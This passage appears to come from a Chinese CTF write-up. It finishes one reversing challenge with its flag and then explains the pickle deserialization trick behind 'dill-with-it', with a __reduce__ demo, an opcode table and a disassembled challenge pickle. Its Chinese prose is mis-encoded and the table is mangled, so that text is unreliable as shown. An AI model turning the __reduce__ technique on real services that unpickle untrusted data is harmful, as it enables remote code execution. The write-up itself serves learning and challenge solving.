class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> arr:</span><br><span class="line">        ar -= <span class="built_in">int</span>(r, <span class="number">35</span>)</span><br><span class="line">    hexn = <span class="number">0</span></span><br><span class="line">    <span class="comment"># ar = int(ar.hex(), 17)</span></span><br><span class="line">    <span class="keyword">while</span> ar &gt; <span class="number">0</span>:</span><br><span class="line">        hexn = (hexn * <span class="number">16</span>) + (ar % <span class="number">17</span>)</span><br><span class="line">        ar //= <span class="number">17</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>.fromhex(<span class="built_in">hex</span>(hexn)[<span class="number">2</span>:][::-<span class="number">1</span>])</span><br><span class="line">result2 = func4(data2, flag1)</span><br><span class="line">flag = rd(result2, data1.encode())</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># bytearray(b&#x27;amateursCTF&#123;4t_l3ast_th15_fl4g_isn7_misspelll3d&#125;&#x27;)</span></span><br></pre></td></tr></table></figure>

<h2 id="dill-with-it-py-deserialized-vuln"><a href="#dill-with-it-py-deserialized-vuln" class="headerlink" title="dill-with-it | py-deserialized vuln"></a>dill-with-it | py-deserialized vuln</h2><p><code>main.py</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python 3.10.12</span></span><br><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> loads</span><br><span class="line">larry = <span class="string">b&quot;\x80\x04ctypes\nFunctionType......\x93(VLooks like you got it!\nVNah, try again.\nlg4\n\x86R.&quot;</span></span><br><span class="line"><span class="built_in">print</span>(loads(larry))</span><br></pre></td></tr></table></figure>

<p>ç»™å‡ºäº†ä¸€ä¸²åºåˆ—åŒ–çš„pythonä»£ç  æ­£å¸¸çš„åºåˆ—åŒ–<code>python object</code> å¯ä»¥é€šè¿‡dillåº“æ¥å®Œå…¨è¿˜åŸæºä»£ç (è¦ä½¿ç”¨å¯¹åº”çš„pythonç‰ˆæœ¬çš„dillæˆ–pickleåº“):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Python_object</span>():</span><br><span class="line">    ...</span><br><span class="line">dill.source.getsource(dill.loads(dill.dumps(Python_object)))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def Python_object():</span></span><br><span class="line"><span class="string">    ...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™é“é¢˜åˆ©ç”¨äº†ååºåˆ—åŒ–çš„æ¼æ´ å› ä¸ºååºåˆ—åŒ–å®é™…ä¸Šå°±æ˜¯ç”¨PVMè§£é‡Šåºåˆ—åŒ–çš„pythonä»£ç  å½“åºåˆ—åŒ–çš„ç±»ä¸­å‡ºç°ç±»ä¼¼<code>__reduce__()</code>çš„é­”æœ¯æ–¹æ³• ä¸”å…¶è¿”å›å€¼å½¢å¼ä¸º<code>(callable, (arg1, arg2, ...))</code>æ—¶ ååºåˆ—åŒ–ç”±è¿™ä¸ªç±»å®ä¾‹åŒ–çš„å¯¹è±¡çš„åºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶ä¼šç›´æ¥æ‰§è¡Œ<code>callable(arg1, arg2, ...)</code> æ­¤æ—¶load(s)è¿”å›çš„å°±ä¸æ˜¯ä¸€ä¸ªpython objectè€Œæ˜¯æ‰§è¡Œè¿™ä¸ªå‡½æ•°å¾—åˆ°çš„è¿”å›å€¼ ä¾‹å¦‚:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dill</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Test2</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (Test2, (<span class="number">1</span>, <span class="number">2</span>, ))</span><br><span class="line">t = Test()</span><br><span class="line">serialized = pickle.dumps(t)</span><br><span class="line"><span class="built_in">print</span>(serialized)</span><br><span class="line"><span class="built_in">print</span>(pickletools.dis(serialized))</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(serialized))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x05Test2\x94\x93\x94K\x01K\x02\x86\x94R\x94.&#x27;</span></span><br><span class="line"><span class="string">    0: \x80 PROTO      4</span></span><br><span class="line"><span class="string">    2: \x95 FRAME      30</span></span><br><span class="line"><span class="string">   11: \x8c SHORT_BINUNICODE &#x27;__main__&#x27;</span></span><br><span class="line"><span class="string">   21: \x94 MEMOIZE    (as 0)</span></span><br><span class="line"><span class="string">   22: \x8c SHORT_BINUNICODE &#x27;Test2&#x27;</span></span><br><span class="line"><span class="string">   29: \x94 MEMOIZE    (as 1)</span></span><br><span class="line"><span class="string">   30: \x93 STACK_GLOBAL</span></span><br><span class="line"><span class="string">   31: \x94 MEMOIZE    (as 2)</span></span><br><span class="line"><span class="string">   32: K    BININT1    1</span></span><br><span class="line"><span class="string">   34: K    BININT1    2</span></span><br><span class="line"><span class="string">   36: \x86 TUPLE2</span></span><br><span class="line"><span class="string">   37: \x94 MEMOIZE    (as 3)</span></span><br><span class="line"><span class="string">   38: R    REDUCE</span></span><br><span class="line"><span class="string">   39: \x94 MEMOIZE    (as 4)</span></span><br><span class="line"><span class="string">   40: .    STOP</span></span><br><span class="line"><span class="string">highest protocol among opcodes = 4</span></span><br><span class="line"><span class="string">None</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>pickletools.dis(serialized)</code>å¯ä»¥ç”¨æ¥æ‰“å°å¯è¯»æ€§æ›´é«˜çš„PVM opcode è¯¥ç‰ˆæœ¬çš„opcodeé‡Šä¹‰å¦‚ä¸‹:</p>
<table>
<thead>
<tr>
<th>MARK</th>
<th>&#x3D; bâ€™(â€˜</th>
<th># push special markobject on stack</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>STOP</td>
<td>&#x3D; bâ€™.â€™</td>
<td># every pickle ends with STOP</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>POP</td>
<td>&#x3D; bâ€™0â€™</td>
<td># discard topmost stack item</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>POP_MARK</td>
<td>&#x3D; bâ€™1â€™</td>
<td># discard stack top through topmost markobject</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>DUP</td>
<td>&#x3D; bâ€™2â€™</td>
<td># duplicate top stack item</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>FLOAT</td>
<td>&#x3D; bâ€™Fâ€™</td>
<td># push float object; decimal string argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>INT</td>
<td>&#x3D; bâ€™Iâ€™</td>
<td># push integer or bool; decimal string argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BININT</td>
<td>&#x3D; bâ€™Jâ€™</td>
<td># push four-byte signed int</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BININT1</td>
<td>&#x3D; bâ€™Kâ€™</td>
<td># push 1-byte unsigned int</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>LONG</td>
<td>&#x3D; bâ€™Lâ€™</td>
<td># push long; decimal string argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BININT2</td>
<td>&#x3D; bâ€™Mâ€™</td>
<td># push 2-byte unsigned int</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>NONE</td>
<td>&#x3D; bâ€™Nâ€™</td>
<td># push None</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>PERSID</td>
<td>&#x3D; bâ€™Pâ€™</td>
<td># push persistent object; id is taken from string arg</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINPERSID</td>
<td>&#x3D; bâ€™Qâ€™</td>
<td>#</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ</td>
<td>;</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ</td>
<td>stack</td>
</tr>
<tr>
<td>REDUCE</td>
<td>&#x3D; bâ€™Râ€™</td>
<td># apply callable to argtuple, both on stack</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>STRING</td>
<td>&#x3D; bâ€™Sâ€™</td>
<td># push string; NL-terminated string argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINSTRING</td>
<td>&#x3D; bâ€™Tâ€™</td>
<td># push string; counted binary string argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>SHORT_BINSTRING&#x3D; bâ€™Uâ€™</td>
<td>#</td>
<td>â€œ</td>
<td>â€œ</td>
<td>;</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ &lt; 256 bytes</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>UNICODE</td>
<td>&#x3D; bâ€™Vâ€™</td>
<td># push Unicode string; raw-unicode-escapedâ€™d argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINUNICODE</td>
<td>&#x3D; bâ€™Xâ€™</td>
<td>#</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ</td>
<td>; counted UTF-8 string argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>APPEND</td>
<td>&#x3D; bâ€™aâ€™</td>
<td># append stack top to list below it</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BUILD</td>
<td>&#x3D; bâ€™bâ€™</td>
<td># call <strong>setstate</strong> or <strong>dict</strong>.update()</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>GLOBAL</td>
<td>&#x3D; bâ€™câ€™</td>
<td># push self.find_class(modname, name); 2 string args</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>DICT</td>
<td>&#x3D; bâ€™dâ€™</td>
<td># build a dict from stack items</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>EMPTY_DICT</td>
<td>&#x3D; bâ€™}â€™</td>
<td># push empty dict</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>APPENDS</td>
<td>&#x3D; bâ€™eâ€™</td>
<td># extend list on stack by topmost stack slice</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>GET</td>
<td>&#x3D; bâ€™gâ€™</td>
<td># push item from memo on stack; index is string arg</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINGET</td>
<td>&#x3D; bâ€™hâ€™</td>
<td>#</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ</td>
<td>;</td>
<td>â€œ</td>
<td>â€œ 1-byte arg</td>
</tr>
<tr>
<td>INST</td>
<td>&#x3D; bâ€™iâ€™</td>
<td># build &amp; push class instance</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>LONG_BINGET</td>
<td>&#x3D; bâ€™jâ€™</td>
<td># push item from memo on stack; index is 4-byte arg</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>LIST</td>
<td>&#x3D; bâ€™lâ€™</td>
<td># build list from topmost stack items</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>EMPTY_LIST</td>
<td>&#x3D; bâ€™]â€™</td>
<td># push empty list</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>OBJ</td>
<td>&#x3D; bâ€™oâ€™</td>
<td># build &amp; push class instance</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>PUT</td>
<td>&#x3D; bâ€™pâ€™</td>
<td># store stack top in memo; index is string arg</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINPUT</td>
<td>&#x3D; bâ€™qâ€™</td>
<td>#</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ ;</td>
<td>â€œ</td>
<td>â€œ 1-byte arg</td>
<td></td>
<td></td>
</tr>
<tr>
<td>LONG_BINPUT</td>
<td>&#x3D; bâ€™râ€™</td>
<td>#</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ ;</td>
<td>â€œ</td>
<td>â€œ 4-byte arg</td>
<td></td>
<td></td>
</tr>
<tr>
<td>SETITEM</td>
<td>&#x3D; bâ€™sâ€™</td>
<td># add key+value pair to dict</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>TUPLE</td>
<td>&#x3D; bâ€™tâ€™</td>
<td># build tuple from topmost stack items</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>EMPTY_TUPLE</td>
<td>&#x3D; bâ€™)â€™</td>
<td># push empty tuple</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>SETITEMS</td>
<td>&#x3D; bâ€™uâ€™</td>
<td># modify dict by adding topmost key+value pairs</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINFLOAT</td>
<td>&#x3D; bâ€™Gâ€™</td>
<td># push float; arg is 8-byte float encoding</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>TRUE</td>
<td>&#x3D; bâ€™I01\nâ€™</td>
<td># not an opcode; see INT docs in pickletools.py</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>FALSE</td>
<td>&#x3D; bâ€™I00\nâ€™</td>
<td># not an opcode; see INT docs in pickletools.py</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td># Protocol 2</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>PROTO</td>
<td>&#x3D; bâ€™\x80â€™</td>
<td># identify pickle protocol</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>NEWOBJ</td>
<td>&#x3D; bâ€™\x81â€™</td>
<td># build object by applying cls.<strong>new</strong> to argtuple</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>EXT1</td>
<td>&#x3D; bâ€™\x82â€™</td>
<td># push object from extension registry; 1-byte index</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>EXT2</td>
<td>&#x3D; bâ€™\x83â€™</td>
<td># ditto, but 2-byte index</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>EXT4</td>
<td>&#x3D; bâ€™\x84â€™</td>
<td># ditto, but 4-byte index</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>TUPLE1</td>
<td>&#x3D; bâ€™\x85â€™</td>
<td># build 1-tuple from stack top</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>TUPLE2</td>
<td>&#x3D; bâ€™\x86â€™</td>
<td># build 2-tuple from two topmost stack items</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>TUPLE3</td>
<td>&#x3D; bâ€™\x87â€™</td>
<td># build 3-tuple from three topmost stack items</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>NEWTRUE</td>
<td>&#x3D; bâ€™\x88â€™</td>
<td># push True</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>NEWFALSE</td>
<td>&#x3D; bâ€™\x89â€™</td>
<td># push False</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>LONG1</td>
<td>&#x3D; bâ€™\x8aâ€™</td>
<td># push long from &lt; 256 bytes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>LONG4</td>
<td>&#x3D; bâ€™\x8bâ€™</td>
<td># push really big long</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>_tuplesize2code &#x3D; [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td># Protocol 3 (Python 3.x)</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINBYTES</td>
<td>&#x3D; bâ€™Bâ€™</td>
<td># push bytes; counted binary string argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>SHORT_BINBYTES &#x3D; bâ€™Câ€™</td>
<td>#</td>
<td>â€œ</td>
<td>â€œ</td>
<td>;</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ</td>
<td>â€œ &lt; 256 bytes</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td># Protocol 4</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>SHORT_BINUNICODE &#x3D; bâ€™\x8câ€™</td>
<td># push short string; UTF-8 length &lt; 256 bytes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINUNICODE8</td>
<td>&#x3D; bâ€™\x8dâ€™</td>
<td># push very long string</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINBYTES8</td>
<td>&#x3D; bâ€™\x8eâ€™</td>
<td># push very long bytes string</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>EMPTY_SET</td>
<td>&#x3D; bâ€™\x8fâ€™</td>
<td># push empty set on the stack</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>ADDITEMS</td>
<td>&#x3D; bâ€™\x90â€™</td>
<td># modify set by adding topmost stack items</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>FROZENSET</td>
<td>&#x3D; bâ€™\x91â€™</td>
<td># build frozenset from topmost stack items</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>NEWOBJ_EX</td>
<td>&#x3D; bâ€™\x92â€™</td>
<td># like NEWOBJ but work with keyword only arguments</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>STACK_GLOBAL</td>
<td>&#x3D; bâ€™\x93â€™</td>
<td># same as GLOBAL but using names on the stacks</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MEMOIZE</td>
<td>&#x3D; bâ€™\x94â€™</td>
<td># store top of the stack in memo</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>FRAME</td>
<td>&#x3D; bâ€™\x95â€™</td>
<td># indicate the beginning of a new frame</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td># Protocol 5</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BYTEARRAY8</td>
<td>&#x3D; bâ€™\x96â€™</td>
<td># push bytearray</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>NEXT_BUFFER</td>
<td>&#x3D; bâ€™\x97â€™</td>
<td># push next out-of-band buffer</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>READONLY_BUFFER</td>
<td>&#x3D; bâ€™\x98â€™</td>
<td># make top of stack readonly</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>ç»“åˆæ­¤è¡¨å¯ä»¥çœ‹å‡º<code>__reduce__()</code>æ¼æ´å®ç°çš„åº•å±‚åŸç†æ˜¯è¿™æ ·çš„æŒ‡ä»¤ç»“æ„:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># MEMOIZE/GET/...            ç”¨ä»¥ç¡®ä¿æ ˆä¸Šä¸€å®šæœ‰æ¥ä¸‹æ¥REDUCEè¦ä½¿ç”¨çš„å‡½æ•°</span><br><span class="line">STACK_GLOBAL/GLOBAL            è·å–è¿™ä¸ªå‡½æ•°</span><br><span class="line">MARK</span><br><span class="line">    DATATYPE arg1</span><br><span class="line">    DATATYPE arg2</span><br><span class="line">    ...</span><br><span class="line">    TUPLE                    å°†å‚æ•°æ­£åºå…¥æ ˆ è‹¥å‚æ•°ä¸ªæ•°è¶…è¿‡3ä¸ªå°±ä¼šç”¨è¿™æ ·çš„æ–¹å¼æ‰“åŒ…å…¥æ ˆ å¦åˆ™å°±ä¼šç”¨TUPLExç›´æ¥å…¥æ ˆ</span><br><span class="line">REDUCE                        å·²è¿™äº›å‚æ•°æ‰§è¡Œå‡½æ•°å¹¶å°†è¿”å›å€¼ä»¥å…ƒç»„çš„æ–¹å¼æ‰“åŒ…æ”¾åœ¨æ ˆé¡¶</span><br></pre></td></tr></table></figure>

<p>æœ‰äº†è¿™äº›åŸºç¡€çŸ¥è¯†å†çœ‹è¿™é¢˜ å…ˆç”¨disæ‰“å°å‡ºå¯è¯»æ€§è¾ƒé«˜çš„æŒ‡ä»¤:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  0: \x80 PROTO      4</span><br><span class="line">  2: c    GLOBAL     &#x27;types FunctionType&#x27;</span><br><span class="line"> 22: (    MARK</span><br><span class="line"> 23: c        GLOBAL     &#x27;types CodeType&#x27;</span><br><span class="line"> 39: (        MARK</span><br><span class="line"> 40: I            INT        1</span><br><span class="line"> 43: I            INT        0</span><br><span class="line"> 46: I            INT        0</span><br><span class="line"> 49: I            INT        4</span><br><span class="line"> 52: I            INT        8</span><br><span class="line"> 55: I            INT        67</span><br><span class="line"> 59: C            SHORT_BINBYTES b&#x27;t\x00\xa0\x01|\x00d\x01\xa1\x02&#125;\x01t\x02|\x01\x83\x01d\x00d\x00d\x02\x85\x03\x19\x00d\x00d\x03\x85\x02\x19\x00&#125;\x00d\x04&#125;\x02t\x03d\x05t\x04|\x00\x83\x01d\x06\x83\x03D\x00]\x11&#125;\x03|\x02t\x05t\x00|\x00|\x03|\x03d\x06\x17\x00\x85\x02\x19\x00d\x07\x83\x02\x83\x017\x00&#125;\x02q\x1d|\x02S\x00&#x27;</span><br><span class="line">159: (            MARK</span><br><span class="line">160: N                NONE</span><br><span class="line">161: V                UNICODE    &#x27;big&#x27;</span><br><span class="line">166: I                INT        -1</span><br><span class="line">170: I                INT        -3</span><br><span class="line">174: V                UNICODE    &#x27;&#x27;</span><br><span class="line">176: I                INT        0</span><br><span class="line">179: I                INT        8</span><br><span class="line">182: I                INT        2</span><br><span class="line">185: t                TUPLE      (MARK at 159)</span><br><span class="line">186: (            MARK</span><br><span class="line">187: V                UNICODE    &#x27;int&#x27;</span><br><span class="line">192: V                UNICODE    &#x27;from_bytes&#x27;</span><br><span class="line">204: V                UNICODE    &#x27;bin&#x27;</span><br><span class="line">209: V                UNICODE    &#x27;range&#x27;</span><br><span class="line">216: V                UNICODE    &#x27;len&#x27;</span><br><span class="line">221: V                UNICODE    &#x27;chr&#x27;</span><br><span class="line">226: t                TUPLE      (MARK at 186)</span><br><span class="line">227: (            MARK</span><br><span class="line">228: \x8c             SHORT_BINUNICODE &#x27;ğŸ”¥&#x27;</span><br><span class="line">234: \x8c             SHORT_BINUNICODE &#x27;ğŸ¤«&#x27;</span><br><span class="line">240: \x8c             SHORT_BINUNICODE &#x27;ğŸ§&#x27;</span><br><span class="line">246: \x8c             SHORT_BINUNICODE &#x27;ğŸµ&#x27;</span><br><span class="line">252: t                TUPLE      (MARK at 227)</span><br><span class="line">253: V            UNICODE    &#x27;dill-with-it&#x27;</span><br><span class="line">267: \x8c         SHORT_BINUNICODE &#x27;ğŸ“®&#x27;</span><br><span class="line">273: I            INT        0</span><br><span class="line">276: C            SHORT_BINBYTES b&#x27;\x00\x01\x0c\x01\x1a\x01\x04\x01\x14\x01 \x01&#x27;</span><br><span class="line">290: )            EMPTY_TUPLE</span><br><span class="line">291: )            EMPTY_TUPLE</span><br><span class="line">292: t            TUPLE      (MARK at 39)</span><br><span class="line">293: \x81     NEWOBJ</span><br><span class="line">294: c        GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="line">312: )        EMPTY_TUPLE</span><br><span class="line">313: R        REDUCE</span><br><span class="line">314: \x8c     SHORT_BINUNICODE &#x27;ğŸ“®&#x27;</span><br><span class="line">320: t        TUPLE      (MARK at 22)</span><br><span class="line">321: \x81 NEWOBJ</span><br><span class="line">322: \x94 MEMOIZE    (as 0)</span><br><span class="line">323: 0    POP</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>ä¸€å¼€å§‹æ˜¯å…ˆç”¨<code>types.CodeType</code>å’Œ<code>types.FunctionType</code>æ¥å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°å¹¶åœ¨MEMOä¸­ä»¥èµ‹ä»¥ç¼–å·0 ç¿»è¯‘ä¸ºpythonä»£ç å¤§è‡´ä¸º:</p>
